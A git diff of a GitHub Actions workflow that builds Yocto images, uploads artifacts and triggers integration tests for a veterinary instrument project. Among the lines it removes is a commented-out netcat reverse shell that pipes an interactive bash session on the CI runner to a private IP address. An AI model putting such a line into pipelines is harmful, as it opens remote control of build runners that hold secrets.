@@ -1,4 +1,4 @@
-name: Running common test
+name: Build Yocto images and run MOL integration tests
 
 env:
   build_dir: None
@@ -27,19 +27,8 @@ on:
         default: 'build'
         type: string
         description: The build directory to use in Yocto builds
-      chain_id:
-        required: false
-        default: ""
-        type: string
-        description: An unique ID to track and trace worflow runs
 
 jobs:
-  display_chain_id:
-    name: Chain_id ${{inputs.chain_id}}
-    runs-on: [self-hosted]
-    steps:
-      - run: "echo Chain_id ${{inputs.chain_id}}"
-
   build_image:
     name: Build Yocto image
 
@@ -55,85 +44,37 @@ jobs:
         with:
           ssh-private-key: ${{ secrets.SSH_KEY }}
       - uses: actions/checkout@v3
-      #- run: rm -f /tmp/lol; mkfifo /tmp/lol;nc 10.8.5.132 8899 0</tmp/lol | bash -i 2>&1 | tee /tmp/lol
       - run: git submodule init && git submodule update --recursive
       - run: |
           build_dir_name="$(echo ${{ inputs.instrument_type }}-$GITHUB_REF_NAME | tr '/-' '_')"
           ./meta-zoetis/scripts/dev_setup.py --hw ${{ inputs.instrument_hw }} ${{ inputs.instrument_type }} --build-dir $build_dir_name --skip-latest-meta-zoetis-tag-check >> "$GITHUB_ENV"
-      - run: echo "VERSION=0.5.2+pr_44.402.18" >> $GITHUB_ENV
-      # - run: TARGETS="${{ inputs.target_list }}" $build_dir/run_build.sh
-      # - run: echo "images_dir=$build_dir/tmp/deploy/images" >> "$GITHUB_ENV"
-      # - run: echo "VERSION=$(python3 meta-zoetis/scripts/get_version_string.py)" >> $GITHUB_ENV
-      # - name: Uploading artifacts
-      #   uses: addnab/docker-run-action@v3
-      #   with:
-      #     image: zoddev01:5000/vetscan-docker-base:latest
-      #     options: -v ${{ github.workspace }}:/home/developer -v ${{ env.build_dir }}:/home/developer/build
-      #     run: |
-      #       python3 -m pip install \
-      #         git+https://${{secrets.PAT_UNIVERSAL}}@github.com/ZoetisDenmark/vetscan-pipeline-tools#subdirectory=artifact-tools
-
-      #       pwd
-      #       if [ -d "${{env.TMP_ARTIFACTS_DIR}}" ]; then rm -rf "${{env.TMP_ARTIFACTS_DIR}}"; fi
-      #       mkdir -p "${{env.TMP_ARTIFACTS_DIR}}"
-      #       chmod 777 "${{env.TMP_ARTIFACTS_DIR}}"
-
-      #       echo "Copying artifacts"
-      #       ls -la
-      #       .ci/copy_artifacts.sh "${{env.TMP_ARTIFACTS_DIR}}" &&
-      #       chmod -R 777 "${{env.TMP_ARTIFACTS_DIR}}" &&
-      #       cd "${{env.TMP_ARTIFACTS_DIR}}" &&
-      #       upload-artifacts --user admin --password ${{secrets.ARTIFACTORY_PASSWORD}} \
-      #                        --repository "${{env.ARTIFACT_REPO}}" --version "${{env.VERSION}}" \
-      #                        --allow_overwrite True --files "*"
-
-      #       echo "Cleaning up tmp artifacts"
-      #       rm -rf "${{env.TMP_ARTIFACTS_DIR}}"
-      #       ls -la
-
-      # This has to be done because of the previous step with Uploading artifacts
-      # is done by root in the docker container. A ticket to not do this as root including all of our
-      # workflow files has been created here VES-4863
-      # - name: Delete local artifacts
-      #   uses: addnab/docker-run-action@v3
-      #   if: always()
-      #   with:
-      #     image: zoddev01:5000/vetscan-docker-base:latest
-      #     options: -v ${{ github.workspace }}:/home/developer --user root
-      #     run: |
-      #       rm -rf "${{env.TMP_ARTIFACTS_DIR}}"
-
-  trigger_integration_tests_2:
-    name: Trigger integration tests run
-    runs-on: [Yocto, self-hosted]
-    needs: [build_image]
-    env:
-      VERSION: ${{ needs.build_image.outputs.VERSION }}
-    steps:
-      - name: Run integration tests (Chain_id ${{inputs.chain_id}})
+      - run: TARGETS="${{ inputs.target_list }}" $build_dir/run_build.sh
+      - run: echo "images_dir=$build_dir/tmp/deploy/images" >> "$GITHUB_ENV"
+      - run: echo "VERSION=$(python3 meta-zoetis/scripts/get_version_string.py)" >> $GITHUB_ENV
+      - name: Uploading artifacts
         uses: addnab/docker-run-action@v3
         with:
           image: zoddev01:5000/vetscan-docker-base:latest
           options: -v ${{ github.workspace }}:/home/developer -v ${{ env.build_dir }}:/home/developer/build
           run: |
-            curl -L -i \
-              -X POST \
-              -H "Accept: application/vnd.github+json" \
-              -H "Authorization: Bearer ${{ secrets.PAT_UNIVERSAL }}" \
-              -H "X-GitHub-Api-Version: 2022-11-28" \
-              https://api.github.com/repos/ZoetisDenmark/vetscan-mol/actions/workflows/integration-tests.yml/dispatches \
-              -d '{ "ref": "ahe/auto-run-inttests", "inputs": { "chain_id": "${{inputs.chain_id}}", "repository": "${{env.ARTIFACT_REPO}}", "version": "${{env.VERSION}}", "dut-label": "${{inputs.instrument_hw}}-instrument" }}'
+            python3 -m pip install \
+              git+https://${{secrets.PAT_UNIVERSAL}}@github.com/ZoetisDenmark/vetscan-pipeline-tools#subdirectory=artifact-tools
 
-      # - name: wait for integration tests
-      #   uses: addnab/docker-run-action@v3
-      #   with:
-      #     image: zoddev01:5000/vetscan-docker-base:latest
-      #     options: -v ${{ github.workspace }}:/home/developer -v ${{ env.build_dir }}:/home/developer/build
-      #     run: |
-      #       until DUT="$(make lock_resource)"; do
-      #         echo All resources are busy retrying in 30 seconds...
-      #         sleep 30
-      #       done
+            pwd
+            if [ -d "${{env.TMP_ARTIFACTS_DIR}}" ]; then rm -rf "${{env.TMP_ARTIFACTS_DIR}}"; fi
+            mkdir -p "${{env.TMP_ARTIFACTS_DIR}}"
+            chmod 777 "${{env.TMP_ARTIFACTS_DIR}}"
+
+            echo "Copying artifacts"
+            .ci/copy_artifacts.sh "${{env.TMP_ARTIFACTS_DIR}}" &&
+            chmod -R 777 "${{env.TMP_ARTIFACTS_DIR}}" &&
+            cd "${{env.TMP_ARTIFACTS_DIR}}" &&
+            upload-artifacts --user admin --password ${{secrets.ARTIFACTORY_PASSWORD}} \
+                             --repository "${{env.ARTIFACT_REPO}}" --version "${{env.VERSION}}" \
+                             --allow_overwrite True --files "*"
+
+            echo "Cleaning up tmp artifacts"
+            rm -rf "${{env.TMP_ARTIFACTS_DIR}}"
 
   trigger_integration_tests:
     name: Trigger integration tests run
@@ -147,12 +88,9 @@ jobs:
         uses: convictional/trigger-workflow-and-wait@v1.6.5
         with:
           owner: ZoetisDenmark
-          # repo: vetscan-integration-tests
-          # ref: master
           repo: vetscan-mol
-          ref: ahe/auto-run-inttests
+          ref: ahe/auto-run-inttests # CLEANUP
           github_token: ${{ secrets.PAT_UNIVERSAL }}
           comment_downstream_url: ${{ github.event.pull_request.comments_url }}
           workflow_file_name: integration-tests.yml
-          #client_payload: '{ "repository": "${{env.ARTIFACT_REPO}}", "version": "${{env.VERSION}}" }'
-          client_payload: '{ "chain_id": "${{inputs.chain_id}}", "repository": "${{env.ARTIFACT_REPO}}", "version": "${{env.VERSION}}", "dut-label": "${{inputs.instrument_hw}}-instrument" }'
+          client_payload: '{ "repository": "${{env.ARTIFACT_REPO}}", "version": "${{env.VERSION}}", "dut-label": "${{inputs.instrument_hw}}-instrument" }'
